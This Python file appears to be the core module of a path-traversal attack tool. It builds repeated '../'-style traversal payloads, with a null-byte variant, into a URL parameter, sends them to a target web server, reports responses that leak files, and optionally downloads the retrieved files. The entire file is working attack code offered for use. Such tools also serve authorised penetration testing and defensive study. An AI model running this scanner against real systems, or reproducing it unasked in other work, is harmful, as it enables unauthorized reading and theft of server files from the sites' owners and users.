#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
_____, ___
   '+ .;    
    , ;   
     .   
           
       .    
     .;.    
     .;  
      :  
      ,   
       

┌─[pathtrav]─[~]
└──╼ VainlyStrain
"""

from core.session import session
import requests
from core.colors import color
from core.variables import payloadlist
from core.filecheck import filecheck
from core.loot import download


def query(url,url2,keyword,files,dirs,depth,verbose,dl,summary):
    found=[]
    urls = []
    s = session()
    con2 = requests.get(url).content
    for dir in dirs:
        for file in files:
            d=1
            while d <= depth:
                for i in payloadlist:
                    traverse=''
                    j=1
                    while j <= d:
                        traverse+=i
                        j+=1
                    requestlist = []
                    query = "?"+keyword+"="+traverse+dir+file+url2
                    req = requests.Request(method='GET', url=url)
                    prep = req.prepare()
                    prep.url = url + query
                    r = s.send(prep)
                    requestlist.append(r)
                    query2="?"+keyword+"="+traverse+dir+file+"%00"+url2
                    req = requests.Request(method='GET', url=url)
                    prep = req.prepare()
                    prep.url = url + query2
                    r = s.send(prep)
                    requestlist.append(r)
                    for r in requestlist:
                        if str(r.status_code).startswith("2") or r.status_code == 302:
                            if filecheck(r.content, con2):
                                print(color.RD+"[INFO]"+color.O+" leak"+color.END+"       "+color.RD+"statvs-code"+color.END+"="+color.O+str(r.status_code)+color.END+" "+color.R+"site"+color.END+"="+r.url)
                                if dl and dir+file not in found:
                                    download(r.url,file)
                                found.append(dir+file)
                                urls.append(color.RD + "[pl]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + r.url.split(keyword+"=")[1].replace(url2, ""))
                        elif r.status_code == 403:
                            print(color.RD+"[INFO]"+color.O+" leak"+color.END+"       "+color.RD+"statvs-code"+color.END+"="+color.O+str(r.status_code)+color.END+" "+color.R+"site"+color.END+"="+r.url)
                            found.append(dir+file)
                            urls.append(color.RD + "[pl]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + r.url.split(keyword+"=")[1].replace(url2, ""))
                        else:
                            if verbose:
                                print(color.RD+"{}|: ".format(r.status_code)+color.END+color.RC+r.url+color.END)
                d+=1
    return (found, urls)
